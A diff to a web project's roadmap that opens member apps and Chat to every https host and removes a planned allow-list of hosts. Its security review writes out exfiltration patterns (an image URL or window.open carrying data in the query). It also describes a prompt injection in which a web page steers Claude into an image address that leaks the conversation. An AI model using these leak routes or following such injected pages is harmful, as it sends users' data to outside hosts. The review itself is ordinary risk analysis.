@@ -105,6 +105,9 @@ each entry below says whether it is pre-approved.
    only after every security test passes and the owner turns it on); Chat
    shows such images only behind a switch that starts off. Full spec:
    [web-search-and-images](#web-search-and-images--full-spec).
+   **B superseded 2026-10-22 by app-open-services (9):** apps and Chat
+   load outside images directly (https), so the image fetch service is
+   not built; A stays as merged.
 
 1. **app-platform P5** · M3 · branch `feat-app-platform-p5`
    *Branch + tests + WAIT — not pre-approved.* "CTRL+AI 기능 상자" for
@@ -177,6 +180,10 @@ each entry below says whether it is pre-approved.
     sizes and a load-time check belong to the review. **Example apps the
     owner wants:** 테트리스 (Phaser or plain canvas), 사주 (date maths +
     Chart.js/p5 for the chart) — the same two named under builder-python.
+    **Mostly superseded 2026-10-22 by app-open-services (9):** apps may
+    load these libraries from cdnjs/jsDelivr (pinned versions), and the
+    Builder's app rules name them there. Close this item when 9 merges,
+    unless the owner still wants self-hosted copies (no outside load).
 
 7. **dino-avatars** · M3 · branch `feat-dino-avatars`
     *Later item, order unchanged, not pre-approved.* Owner, 2026-10-16
@@ -246,85 +253,87 @@ each entry below says whether it is pre-approved.
        later option behind the same seam, not part of this item.
 
 9. **app-open-services** · M3 · branch `feat-app-open-services`
-    *Owner's direction 2026-10-22, not pre-approved — branch, test, report,
-    WAIT; after auto-depth; **free services only**.* Started as "app-maps"
-    (여행 일정 메이커's map is pins on a blank background); the owner then
-    asked for the general case: **"it may not only be maps … each time do i
-    have to add something to the server. i just want the claude to do it"**
-    and "do what u think is best".
-    1. **One admin-managed allow-list of outside services** (Admin › Community
-       › 앱, audited), seeded with free, keyless, well-known hosts: maps
-       (**OpenFreeMap** — OpenStreetMap, MapLibre-ready, whole world), images
-       (Wikimedia), weather (Open-Meteo), libraries (cdnjs, jsDelivr —
-       covers most of app-libraries), and a few data APIs (countries,
-       Frankfurter rates). Each entry: host, what it is for, which CSP
-       directives (`connect-src`, `img-src`, `script-src`, `style-src`,
-       `font-src`), on/off. **Adding one is a switch, not a deploy.**
-    2. **Each app's CSP is built from the list** (exact hosts, https only;
-       everything else stays blocked). Never allowed: hosts where anyone can
-       post and read data back (paste sites, webhooks, request bins, open
-       proxies, URL shorteners) — they would carry visitor data out; a test
-       holds a deny list and the shape checks.
-    3. **Claude uses them by itself:** the Builder's app rules list the
-       hosts in force (and how to use the map one: MapLibre + OpenFreeMap
-       style, "© OpenStreetMap contributors"). Asked for something not on
-       the list, Claude says so and the member can send a 요청 the admin
-       approves with one click.
-    4. **Privacy:** visitors' IP addresses reach the listed services — one
-       line in the 개인정보 처리방침; no cookies or `ctrlai.user` data are
-       sent by the shell.
-    5. **Maps first:** 여행 일정 메이커 gets a real map as the first user. If
-       OpenFreeMap ever stops, the fallback is a self-hosted Protomaps file
-       (OpenStreetMap, no key) on our own Caddy — the apps do not change.
-    Overlaps to settle at its start: app-libraries (CDN hosts) and
-    web-search-and-images B (server-fetched images) — keep whichever is
-    simpler for each case.
+    *Owner's decision 2026-10-22, not pre-approved — branch, test, report,
+    WAIT; after auto-depth.* Started as "app-maps" (여행 일정 메이커's map
+    is pins on a blank background); the owner then asked for the general
+    case — **"it may not only be maps … each time do i have to add
+    something to the server. i just want the claude to do it"** — and,
+    after the review below, chose to open the network instead of an
+    allow-list: **"채팅이든 앱이든 하면 될 것 같은데"**, with the privacy
+    notice covering it (members are already told to be careful). This
+    replaces the earlier plan (an admin-managed allow-list of hosts, a
+    요청/승인 flow and a deny list of paste sites and webhooks).
+    1. **Apps: every https host.** The member files' CSP
+       (`app_files_csp` in `backend/app/services/app_shell.py` and the
+       same line in `deploy/Caddyfile`, kept equal by a test) allows
+       `https:` in `connect-src`, `img-src`, `media-src`, `script-src`,
+       `style-src` and `font-src` (plus today's `'self' data: blob:`); no
+       `http:`, no `ws:`. Unchanged: the sandbox (never
+       `allow-same-origin`), `frame-ancestors`, and the shell's own CSP.
+    2. **Our own API stays shut to apps.** With `https:` open, an app can
+       send requests to `ctrlai.my/api/*`. The standing rules (host-only
+       session cookie, JSON bodies on every state-changing route, no CORS)
+       already answer this; add a test that a request from a sandboxed
+       app frame carries no session and cannot read or change anything.
+    3. **Chat shows outside images.** `ChatMarkdown` renders image
+       Markdown from any https host instead of `[그림: …]`, and the main
+       site's `img-src` allows `https:`. Known risk, accepted: with web
+       search on, a page Claude reads could steer it into an image address
+       that carries that conversation out (only what Claude sees in that
+       conversation — not passwords, sessions, email, other chats or
+       wallets). Covered by the notice (point 5), not by code.
+    4. **Claude uses services by itself.** The Builder's app rules say:
+       outside https services may be used; prefer free, keyless,
+       well-known ones — maps **MapLibre + OpenFreeMap** ("© OpenStreetMap
+       contributors"), weather Open-Meteo, rates Frankfurter, libraries
+       from cdnjs/jsDelivr with pinned versions, photos from Wikimedia
+       Commons (licence and author shown); **never put an API key in app
+       code** (anyone can read it); **never write image addresses from
+       memory** — find them while the app runs (e.g. Wikimedia's search
+       API), since remembered URLs are usually wrong.
+    5. **Privacy notice:** add to the existing 개인정보 처리방침
+       (`frontend/app/privacy/page.tsx` › 4. 누구에게 전달되나) that apps
+       and Chat may load outside services, which then receive the
+       visitor's IP address and whatever that app or answer sends. Same
+       PR: that section still says the beta answers with a mock and sends
+       nothing out — no longer true (production runs real Claude), fix it.
+    6. **Maps first:** 여행 일정 메이커 gets a real map as the first user.
+       If OpenFreeMap ever stops, the fallback is a self-hosted Protomaps
+       file (OpenStreetMap, no key) on our own Caddy.
+    7. **Thumbnails:** the server renderer (`thumbs` worker) keeps its
+       network isolation for now — an app whose look depends on outside
+       loads may photograph without them. Revisit only if it matters.
+    **What it replaces:** most of app-libraries (6) — apps load libraries
+    from a CDN — and web-search-and-images B (server-fetched images) for
+    both apps and Chat; see those entries.
 
-    **Review 2026-10-22 — what opening the apps' network would expose.**
-    *Docs only; the CSP does not change until 기태님 confirms.*
-    - **Today:** apps run on `apps.ctrlai.my` in a frame sandboxed with
-      `allow-scripts allow-forms allow-popups allow-downloads` (never
-      `allow-same-origin`); the files' CSP has `connect-src 'none'`,
-      `img-src 'self' data: blob:` and no CDN
-      (`backend/app/services/app_shell.py` `app_files_csp`,
-      `deploy/Caddyfile`). So no outside photos, map tiles, chart/game
-      libraries or weather/rate APIs.
+    **Review 2026-10-22 — what opening the network exposes** (kept as the
+    reasoning behind the decision):
     - **Safe either way (by structure):** the session cookie (HttpOnly,
-      host-only, and the sandbox has no `allow-same-origin`); account data
+      host-only; the sandbox has no `allow-same-origin`); account data
       (`ctrlai.user()` gives only `displayName` and the per-app
-      `appUserId` — no email); money (AI still goes through the server's
+      `appUserId` — no email); money (AI still goes through
       `usage.charge()`).
-    - **What could leave:** the visitor's IP address; whatever the visitor
-      typed into that app; and anything the app can already read — public
-      `ctrlai.db` data (other members' posts with their `displayName`),
-      AI answers, `displayName`/`appUserId`.
+    - **What could leave:** the visitor's IP address; what the visitor
+      typed into that app; anything the app can already read — public
+      `ctrlai.db` data (other members' posts with `displayName`), AI
+      answers, `displayName`/`appUserId`.
     - **"Display-only" loads are not IP-only.** Any URL can carry data in
       its path or query (`<img src="https://x/?d=…">`), so opening
-      `img-src`/`script-src`/`style-src`/`font-src` to every host is, for
-      leaks, about the same as opening `connect-src`. The split "display
-      loads open, `connect-src` on an allow-list" does not give the
-      protection it looks like.
-    - **Today is not fully closed either.** The files' CSP has no
-      `form-action`, and the sandbox allows forms and popups: a `<form
-      action="https://…">` or a `window.open("https://…?d=…")` can already
-      send typed content out, and a fake login form is already possible.
-      So opening the network adds less new risk than it seems; the visible
-      hole is forms/popups, not `connect-src`.
-    - **Outside scripts and the wallet:** with `script-src` open, a third
-      party's code runs inside the app and could call `ctrlai.ai.ask` on
-      the visitor's wallet — bounded by the per-app cap, 데모 and 기능 상자
-      멈추기, but no longer only the maker's code.
-    - **Conclusion so far:** blocking everything was a conservative default
-      ("member code, so block it all"), not an answer to a specific
-      threat. For an invite-only club with little personal data, the
-      owner's direction is **allow every https host**. If so: one line in
-      the 개인정보 처리방침 ("apps may use outside services; your IP may
-      reach them"), problems handled through 신고, and this replaces points
-      1–3 above (the allow-list and its deny list). Separately worth
-      deciding: whether to close the forms/popups path (`form-action`).
-    - **Waiting for 기태님's confirmation.** If full allow is chosen,
-      settle app-libraries (6) and web-search-and-images B at the same
-      time — much of both may no longer be needed.
+      `img-src`/`script-src`/`style-src`/`font-src` is, for leaks, about
+      the same as opening `connect-src` — the split "display loads open,
+      `connect-src` on an allow-list" protects less than it looks.
+    - **Today was not fully closed either.** The files' CSP has no
+      `form-action` and the sandbox allows forms and popups, so a form
+      post or `window.open("https://…?d=…")` could already send typed
+      content out, and a fake login form was already possible. Opening the
+      network adds little new risk.
+    - **Outside scripts and the wallet:** a third party's script inside an
+      app could call `ctrlai.ai.ask` on the visitor's wallet — bounded by
+      the per-app cap, 데모 and 기능 상자 멈추기.
+    - Blocking everything was a conservative default ("member code, so
+      block it all"), not an answer to a specific threat; for an
+      invite-only club with little personal data, opening is reasonable.
 ---
 
 ## After the beta (specced, not in Next)
@@ -1102,6 +1111,9 @@ a call, fewer when the 1,000원 cap would be passed; the visitor's wallet
 via `usage.charge()` (feature `app_ai`); nothing in 데모; the count on the
 usage row; documented in the 기능 상자 guide and the Builder's app rules;
 covered by 기능 상자 멈추기.
+
+*Superseded 2026-10-22 by app-open-services (9) — apps and Chat load
+outside images directly; B is not built. Kept for the record.*
 
 **B. Image fetch (apps and Chat)** — the browser never calls an outside
 address: the server fetches and serves from our origin (apps:
